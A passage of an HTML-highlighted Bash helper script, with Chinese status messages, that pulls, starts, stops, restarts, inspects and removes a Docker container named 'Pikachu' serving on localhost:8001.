&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;YELLOW&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;正在拉取镜像...&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker pull &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;IMAGE_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# 检查是否已存在同名容器&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; sudo docker ps -a --format &lt;span class="s2"&gt;&amp;#34;{{.Names}}&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep -q &lt;span class="s2"&gt;&amp;#34;^&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;$&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; sudo docker ps --format &lt;span class="s2"&gt;&amp;#34;{{.Names}}&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep -q &lt;span class="s2"&gt;&amp;#34;^&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;$&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;YELLOW&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;容器已在运行中&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;YELLOW&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;发现停止的容器，正在启动...&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker start &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# 创建数据卷（如果不存在）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; ! sudo docker volume ls &lt;span class="p"&gt;|&lt;/span&gt; grep -q &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VOLUME_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;YELLOW&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;创建数据卷: &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VOLUME_NAME&lt;/span&gt;&lt;span class="si"&gt;}${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker volume create &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VOLUME_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# 运行新容器&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker run -d &lt;span class="se"&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; --name &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="se"&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; --restart unless-stopped &lt;span class="se"&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -p &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PORT&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="se"&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -v &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VOLUME_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;:&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VOLUME_PATH&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="se"&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;IMAGE_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="nv"&gt;$?&lt;/span&gt; -eq &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;GREEN&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;✓ Pikachu 容器启动成功！&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BLUE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;容器信息:&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34; 名称: &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34; 镜像: &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;IMAGE_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34; 端口: &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PORT&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34; 数据卷: &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VOLUME_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BLUE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;访问地址:&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; http://localhost:8001&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;RED&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;✗ 容器启动失败&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;stop_container&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; check_docker
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;YELLOW&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;正在停止容器...&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker stop &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="nv"&gt;$?&lt;/span&gt; -eq &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;GREEN&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;✓ 容器已停止&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;RED&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;✗ 停止容器失败&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;restart_container&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; check_docker
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;YELLOW&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;正在重启容器...&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker restart &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="nv"&gt;$?&lt;/span&gt; -eq &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;GREEN&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;✓ 容器已重启&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;RED&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;✗ 重启容器失败&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;show_status&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; check_docker
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BLUE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;容器状态:&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker ps -a --filter &lt;span class="s2"&gt;&amp;#34;name=&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt; --format &lt;span class="s2"&gt;&amp;#34;table {{.Names}}\t{{.Status}}\t{{.Ports}}\t{{.Image}}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;\n&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BLUE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;数据卷信息:&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker volume ls --filter &lt;span class="s2"&gt;&amp;#34;name=&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VOLUME_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;\n&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BLUE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;资源使用情况:&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker stats &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; --no-stream --format &lt;span class="s2"&gt;&amp;#34;table {{.Name}}\t{{.CPUPerc}}\t{{.MemUsage}}\t{{.NetIO}}\t{{.BlockIO}}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;show_logs&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; check_docker
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BLUE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;容器日志 (最后50行):&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker logs --tail &lt;span class="m"&gt;50&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;remove_container&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; check_docker
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;YELLOW&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;正在删除容器...&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker rm &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="nv"&gt;$?&lt;/span&gt; -eq &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
